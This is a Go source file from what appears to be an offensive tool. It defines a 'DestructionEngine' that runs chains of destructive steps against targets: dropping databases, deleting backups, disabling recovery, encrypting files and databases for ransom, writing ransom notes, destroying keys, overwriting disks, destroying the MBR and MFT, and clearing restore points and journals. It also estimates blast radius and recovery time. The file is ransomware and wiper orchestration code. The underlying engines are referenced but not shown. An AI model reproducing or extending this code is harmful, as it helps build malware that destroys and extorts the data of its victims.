package destruction

import (
	"fmt"
	"sync"
	"time"

	"github.com/angel-platform/angel/pkg/logger"
)

type DestructionEngine struct {
	config    *DestructionConfig
	log       *logger.Logger
	database  *DatabaseDestroyer
	ransom    *RansomwareEngine
	wiper     *WiperEngine
	impact    *ImpactAssessor
	mu        sync.RWMutex
	results   []*DestructionResult
}

func NewDestructionEngine(config *DestructionConfig) *DestructionEngine {
	if config == nil {
		config = DefaultDestructionConfig()
	}

	e := &DestructionEngine{
		config:  config,
		log:     logger.New("destruction-engine", logger.LevelInfo),
		results: make([]*DestructionResult, 0),
	}

	e.database = NewDatabaseDestroyer(config)
	e.ransom = NewRansomwareEngine(config)
	e.wiper = NewWiperEngine(config)
	e.impact = NewImpactAssessor()

	return e
}

func (e *DestructionEngine) ExecuteChain(chain *DestructionChain) (*DestructionResult, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	e.log.Info("Executing destruction chain with %d steps", len(chain.Steps))

	start := time.Now()
	totalResult := &DestructionResult{
		Success:   true,
		Method:    "chain",
		Timestamp: time.Now(),
		Details:   make(map[string]string),
	}

	for i, step := range chain.Steps {
		e.log.Info("Executing step %d: %s on %s", i+1, step.Method, step.Target)

		var result *DestructionResult
		var err error

		switch step.Method {
		case MethodDatabaseDrop, MethodFKDrop, MethodAESEncrypt, MethodCorruptData, MethodDeleteBackup, MethodDisableRecovery:
			result, err = e.database.Execute(step.Method, step.Target, step.Params)
		case MethodEncryptFiles, MethodEncryptDB, MethodRansomNote, MethodKeyDestroy:
			result, err = e.ransom.Execute(step.Method, step.Target, step.Params)
		case MethodZeroOverwrite, MethodRandomOverwrite, MethodMBRDestroy, MethodMFTDestroy, MethodVolumeDismount, MethodRestorePtDelete, MethodUSNJournalClear:
			result, err = e.wiper.Execute(step.Method, step.Target, step.Params)
		default:
			err = fmt.Errorf("unknown method: %s", step.Method)
		}

		if err != nil {
			e.log.Error("Step %d failed: %v", i+1, err)
			totalResult.Success = false
			totalResult.Error = fmt.Sprintf("step %d failed: %v", i+1, err)
			if chain.BreakOnError {
				break
			}
			continue
		}

		if result != nil {
			totalResult.Details[fmt.Sprintf("step_%d", i+1)] = result.Method.String()
		}
	}

	totalResult.Duration = time.Since(start)
	e.results = append(e.results, totalResult)

	return totalResult, nil
}

func (e *DestructionEngine) CalculateBlastRadius(target string) (*BlastRadius, error) {
	return e.impact.CalculateBlastRadius(target)
}

func (e *DestructionEngine) EstimateRecoveryTime(damage DamageLevel) time.Duration {
	return e.impact.EstimateRecoveryTime(damage)
}

func (e *DestructionEngine) GetResults() []*DestructionResult {
	e.mu.RLock()
	defer e.mu.RUnlock()

	results := make([]*DestructionResult, len(e.results))
	copy(results, e.results)
	return results
}

func (e *DestructionEngine) SetDryRun(dryRun bool) {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.config.DryRun = dryRun
}

func (e *DestructionEngine) GetConfig() *DestructionConfig {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.config
}
